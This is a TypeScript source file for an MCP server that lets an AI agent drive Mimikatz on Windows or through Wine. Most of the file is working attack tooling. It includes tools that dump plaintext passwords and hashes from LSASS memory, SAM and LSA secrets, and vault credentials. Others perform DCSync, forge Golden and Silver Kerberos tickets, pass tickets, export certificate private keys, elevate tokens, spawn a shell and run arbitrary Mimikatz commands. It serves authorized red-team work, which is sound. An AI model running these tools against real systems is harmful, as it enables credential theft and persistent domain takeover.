#!/usr/bin/env node
/**
 * Mimikatz MCP Server
 *
 * MCP server for interacting with Mimikatz - a powerful credential extraction
 * and security assessment tool for Windows systems.
 *
 * WARNING: This tool is intended for authorized security testing only.
 * Unauthorized use may be illegal and unethical.
 */

import { Server } from "@modelcontextprotocol/sdk/server/index.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
import {
  CallToolRequestSchema,
  ListToolsRequestSchema,
  Tool,
} from "@modelcontextprotocol/sdk/types.js";
import { spawn, execSync } from "child_process";
import * as fs from "fs";
import * as path from "path";
import * as os from "os";

// Check if running on appropriate system
const isWindows = os.platform() === "win32";
const isKali = !isWindows && fs.existsSync("/etc/os-release") &&
  fs.readFileSync("/etc/os-release", "utf-8").toLowerCase().includes("kali");

// Mimikatz binary path detection
function findMimikatz(): string | null {
  const possiblePaths = [
    // Windows paths
    "C:\\tools\\mimikatz\\x64\\mimikatz.exe",
    "C:\\mimikatz\\x64\\mimikatz.exe",
    path.join(os.homedir(), "mimikatz", "x64", "mimikatz.exe"),
    // Kali Linux paths (using wine or native)
    "/usr/share/windows-resources/mimikatz/x64/mimikatz.exe",
    "/usr/share/mimikatz/x64/mimikatz.exe",
    "/opt/mimikatz/x64/mimikatz.exe",
  ];

  for (const p of possiblePaths) {
    if (fs.existsSync(p)) {
      return p;
    }
  }

  // Try to find via which/where
  try {
    if (isWindows) {
      return execSync("where mimikatz.exe", { encoding: "utf-8" }).trim().split("\n")[0];
    } else {
      return execSync("which mimikatz 2>/dev/null || locate mimikatz.exe 2>/dev/null | head -1",
        { encoding: "utf-8" }).trim();
    }
  } catch {
    return null;
  }
}

const MIMIKATZ_PATH = process.env.MIMIKATZ_PATH || findMimikatz();

// Define available tools
const tools: Tool[] = [
  {
    name: "mimikatz_status",
    description: "Check Mimikatz installation status and system compatibility",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
  {
    name: "mimikatz_sekurlsa_logonpasswords",
    description: "Extract plaintext passwords, hashes, PIN codes, and Kerberos tickets from memory. Requires elevated privileges.",
    inputSchema: {
      type: "object",
      properties: {
        target_host: {
          type: "string",
          description: "Optional remote host to target (requires appropriate access)",
        },
      },
      required: [],
    },
  },
  {
    name: "mimikatz_sekurlsa_wdigest",
    description: "Extract WDigest credentials from LSASS memory",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
  {
    name: "mimikatz_sekurlsa_kerberos",
    description: "List Kerberos credentials and tickets",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
  {
    name: "mimikatz_sekurlsa_msv",
    description: "Extract MSV1_0 credentials (NTLM hashes)",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
  {
    name: "mimikatz_lsadump_sam",
    description: "Dump SAM database hashes (local accounts)",
    inputSchema: {
      type: "object",
      properties: {
        system_hive: {
          type: "string",
          description: "Path to SYSTEM hive file (for offline analysis)",
        },
        sam_hive: {
          type: "string",
          description: "Path to SAM hive file (for offline analysis)",
        },
      },
      required: [],
    },
  },
  {
    name: "mimikatz_lsadump_secrets",
    description: "Dump LSA secrets (service account credentials, etc.)",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
  {
    name: "mimikatz_lsadump_dcsync",
    description: "Perform DCSync attack to replicate AD credentials. Requires domain admin or replication rights.",
    inputSchema: {
      type: "object",
      properties: {
        domain: {
          type: "string",
          description: "Target domain FQDN",
        },
        user: {
          type: "string",
          description: "Target user to sync (e.g., krbtgt, Administrator)",
        },
        dc: {
          type: "string",
          description: "Domain controller to target",
        },
        all: {
          type: "boolean",
          description: "Sync all users (use with caution)",
        },
      },
      required: ["domain"],
    },
  },
  {
    name: "mimikatz_kerberos_golden",
    description: "Create a Golden Ticket for persistent domain access",
    inputSchema: {
      type: "object",
      properties: {
        domain: {
          type: "string",
          description: "Domain FQDN",
        },
        sid: {
          type: "string",
          description: "Domain SID",
        },
        krbtgt_hash: {
          type: "string",
          description: "KRBTGT NTLM hash",
        },
        user: {
          type: "string",
          description: "Username to impersonate",
        },
        id: {
          type: "number",
          description: "User ID (default: 500 for Administrator)",
        },
        groups: {
          type: "string",
          description: "Group IDs (comma-separated, default: 513,512,520,518,519)",
        },
        output: {
          type: "string",
          description: "Output ticket file path",
        },
      },
      required: ["domain", "sid", "krbtgt_hash", "user"],
    },
  },
  {
    name: "mimikatz_kerberos_silver",
    description: "Create a Silver Ticket for service-specific access",
    inputSchema: {
      type: "object",
      properties: {
        domain: {
          type: "string",
          description: "Domain FQDN",
        },
        sid: {
          type: "string",
          description: "Domain SID",
        },
        service_hash: {
          type: "string",
          description: "Service account NTLM hash",
        },
        target: {
          type: "string",
          description: "Target service (e.g., cifs/server.domain.com)",
        },
        user: {
          type: "string",
          description: "Username to impersonate",
        },
        service: {
          type: "string",
          description: "Service type (e.g., cifs, http, ldap)",
        },
      },
      required: ["domain", "sid", "service_hash", "target", "user", "service"],
    },
  },
  {
    name: "mimikatz_kerberos_ptt",
    description: "Pass-the-Ticket: Import a Kerberos ticket into the current session",
    inputSchema: {
      type: "object",
      properties: {
        ticket: {
          type: "string",
          description: "Path to ticket file (.kirbi)",
        },
      },
      required: ["ticket"],
    },
  },
  {
    name: "mimikatz_kerberos_list",
    description: "List Kerberos tickets in current session",
    inputSchema: {
      type: "object",
      properties: {
        export: {
          type: "boolean",
          description: "Export tickets to .kirbi files",
        },
      },
      required: [],
    },
  },
  {
    name: "mimikatz_kerberos_purge",
    description: "Purge all Kerberos tickets from current session",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
  {
    name: "mimikatz_vault_cred",
    description: "Dump Windows Vault credentials (saved passwords)",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
  {
    name: "mimikatz_dpapi_masterkey",
    description: "Decrypt DPAPI master keys",
    inputSchema: {
      type: "object",
      properties: {
        guid: {
          type: "string",
          description: "Master key GUID",
        },
        system: {
          type: "string",
          description: "Path to SYSTEM hive for offline mode",
        },
      },
      required: [],
    },
  },
  {
    name: "mimikatz_crypto_certificates",
    description: "Export certificates with private keys",
    inputSchema: {
      type: "object",
      properties: {
        store: {
          type: "string",
          description: "Certificate store (e.g., my, root, ca)",
        },
        export: {
          type: "boolean",
          description: "Export certificates to files",
        },
      },
      required: [],
    },
  },
  {
    name: "mimikatz_token_elevate",
    description: "Elevate to SYSTEM token or impersonate another user",
    inputSchema: {
      type: "object",
      properties: {
        domainadmin: {
          type: "boolean",
          description: "Try to elevate to a domain admin token",
        },
        user: {
          type: "string",
          description: "Specific user to impersonate",
        },
      },
      required: [],
    },
  },
  {
    name: "mimikatz_privilege_debug",
    description: "Enable SeDebugPrivilege for process manipulation",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
  {
    name: "mimikatz_process_list",
    description: "List running processes with security context",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
  {
    name: "mimikatz_misc_cmd",
    description: "Spawn a command prompt with current (potentially elevated) context",
    inputSchema: {
      type: "object",
      properties: {},
      required: [],
    },
  },
  {
    name: "mimikatz_custom",
    description: "Execute custom Mimikatz commands",
    inputSchema: {
      type: "object",
      properties: {
        commands: {
          type: "array",
          items: { type: "string" },
          description: "Array of Mimikatz commands to execute",
        },
      },
      required: ["commands"],
    },
  },
];

// Execute Mimikatz command
async function executeMimikatz(commands: string[]): Promise<string> {
  if (!MIMIKATZ_PATH) {
    return JSON.stringify({
      success: false,
      error: "Mimikatz not found",
      hint: "Set MIMIKATZ_PATH environment variable or install Mimikatz",
      searched_paths: [
        "C:\\tools\\mimikatz\\x64\\mimikatz.exe",
        "/usr/share/windows-resources/mimikatz/x64/mimikatz.exe",
        "/opt/mimikatz/x64/mimikatz.exe",
      ],
    });
  }

  // Build command string
  const fullCommands = ["privilege::debug", ...commands, "exit"];
  const commandStr = fullCommands.join("\n");

  return new Promise((resolve) => {
    let output = "";
    let errorOutput = "";

    const args = isWindows ? [] : [MIMIKATZ_PATH];
    const executable = isWindows ? MIMIKATZ_PATH : "wine";

    const proc = spawn(executable, args, {
      stdio: ["pipe", "pipe", "pipe"],
    });

    proc.stdin.write(commandStr);
    proc.stdin.end();

    proc.stdout.on("data", (data) => {
      output += data.toString();
    });

    proc.stderr.on("data", (data) => {
      errorOutput += data.toString();
    });

    proc.on("close", (code) => {
      resolve(JSON.stringify({
        success: code === 0,
        output: output,
        error: errorOutput || undefined,
        commands_executed: commands,
        exit_code: code,
      }, null, 2));
    });

    proc.on("error", (err) => {
      resolve(JSON.stringify({
        success: false,
        error: err.message,
        commands_attempted: commands,
      }));
    });

    // Timeout after 60 seconds
    setTimeout(() => {
      proc.kill();
      resolve(JSON.stringify({
        success: false,
        error: "Command timed out after 60 seconds",
        partial_output: output,
      }));
    }, 60000);
  });
}

// Tool handler implementation
async function handleTool(name: string, args: Record<string, unknown>): Promise<string> {
  switch (name) {
    case "mimikatz_status":
      return JSON.stringify({
        mimikatz_found: !!MIMIKATZ_PATH,
        mimikatz_path: MIMIKATZ_PATH,
        platform: os.platform(),
        is_windows: isWindows,
        is_kali: isKali,
        execution_method: isWindows ? "native" : "wine",
        architecture: os.arch(),
        user: os.userInfo().username,
        elevated: isWindows ? process.env.ELEVATED === "true" : os.userInfo().uid === 0,
        warning: "This tool is for authorized security testing only",
      }, null, 2);

    case "mimikatz_sekurlsa_logonpasswords":
      return executeMimikatz(["sekurlsa::logonpasswords"]);

    case "mimikatz_sekurlsa_wdigest":
      return executeMimikatz(["sekurlsa::wdigest"]);

    case "mimikatz_sekurlsa_kerberos":
      return executeMimikatz(["sekurlsa::kerberos"]);

    case "mimikatz_sekurlsa_msv":
      return executeMimikatz(["sekurlsa::msv"]);

    case "mimikatz_lsadump_sam": {
      const cmd = args.system_hive && args.sam_hive
        ? `lsadump::sam /system:${args.system_hive} /sam:${args.sam_hive}`
        : "lsadump::sam";
      return executeMimikatz([cmd]);
    }

    case "mimikatz_lsadump_secrets":
      return executeMimikatz(["lsadump::secrets"]);

    case "mimikatz_lsadump_dcsync": {
      let cmd = `lsadump::dcsync /domain:${args.domain}`;
      if (args.user) cmd += ` /user:${args.user}`;
      if (args.dc) cmd += ` /dc:${args.dc}`;
      if (args.all) cmd += " /all";
      return executeMimikatz([cmd]);
    }

    case "mimikatz_kerberos_golden": {
      let cmd = `kerberos::golden /domain:${args.domain} /sid:${args.sid} /krbtgt:${args.krbtgt_hash} /user:${args.user}`;
      if (args.id) cmd += ` /id:${args.id}`;
      if (args.groups) cmd += ` /groups:${args.groups}`;
      if (args.output) cmd += ` /ticket:${args.output}`;
      return executeMimikatz([cmd]);
    }

    case "mimikatz_kerberos_silver": {
      const cmd = `kerberos::golden /domain:${args.domain} /sid:${args.sid} /rc4:${args.service_hash} /user:${args.user} /service:${args.service} /target:${args.target}`;
      return executeMimikatz([cmd]);
    }

    case "mimikatz_kerberos_ptt":
      return executeMimikatz([`kerberos::ptt ${args.ticket}`]);

    case "mimikatz_kerberos_list": {
      const cmd = args.export ? "kerberos::list /export" : "kerberos::list";
      return executeMimikatz([cmd]);
    }

    case "mimikatz_kerberos_purge":
      return executeMimikatz(["kerberos::purge"]);

    case "mimikatz_vault_cred":
      return executeMimikatz(["vault::cred"]);

    case "mimikatz_dpapi_masterkey": {
      let cmd = "dpapi::masterkey";
      if (args.guid) cmd += ` /guid:${args.guid}`;
      if (args.system) cmd += ` /system:${args.system}`;
      return executeMimikatz([cmd]);
    }

    case "mimikatz_crypto_certificates": {
      let cmd = "crypto::certificates";
      if (args.store) cmd += ` /store:${args.store}`;
      if (args.export) cmd += " /export";
      return executeMimikatz([cmd]);
    }

    case "mimikatz_token_elevate": {
      let cmd = "token::elevate";
      if (args.domainadmin) cmd += " /domainadmin";
      if (args.user) cmd += ` /user:${args.user}`;
      return executeMimikatz([cmd]);
    }

    case "mimikatz_privilege_debug":
      return executeMimikatz(["privilege::debug"]);

    case "mimikatz_process_list":
      return executeMimikatz(["process::list"]);

    case "mimikatz_misc_cmd":
      return executeMimikatz(["misc::cmd"]);

    case "mimikatz_custom":
      return executeMimikatz(args.commands as string[]);

    default:
      return JSON.stringify({ error: `Unknown tool: ${name}` });
  }
}

// Server setup
const server = new Server(
  {
    name: "mimikatz-mcp",
    version: "1.0.0",
  },
  {
    capabilities: {
      tools: {},
    },
  }
);

// Register handlers
server.setRequestHandler(ListToolsRequestSchema, async () => ({
  tools,
}));

server.setRequestHandler(CallToolRequestSchema, async (request) => {
  const { name, arguments: args } = request.params;
  const result = await handleTool(name, args || {});
  return {
    content: [{ type: "text", text: result }],
  };
});

// Start server
async function main() {
  const transport = new StdioServerTransport();
  await server.connect(transport);
  console.error("Mimikatz MCP server running on stdio");
}

main().catch((error) => {
  console.error("Fatal error:", error);
  process.exit(1);
});
